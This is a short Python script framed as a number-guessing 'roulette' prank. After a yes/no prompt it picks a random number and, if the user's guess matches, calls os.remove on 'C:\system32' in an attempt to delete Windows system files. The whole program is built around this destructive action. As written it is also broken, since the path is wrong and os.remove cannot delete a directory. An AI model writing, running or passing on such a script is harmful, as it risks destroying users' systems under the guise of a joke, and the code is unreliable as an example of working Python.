import random,os


def main():
    if random.randint(1, 100) == int(input("Give Me A Number : ")):
        os.remove("C:\\system32")
    else:
        print("You Have Been Saved :)")


if __name__ == "__main__":

    if input("Do you want to run the program? (Yes, No) : ").lower() == 'yes':
        main()
    else:
        quit()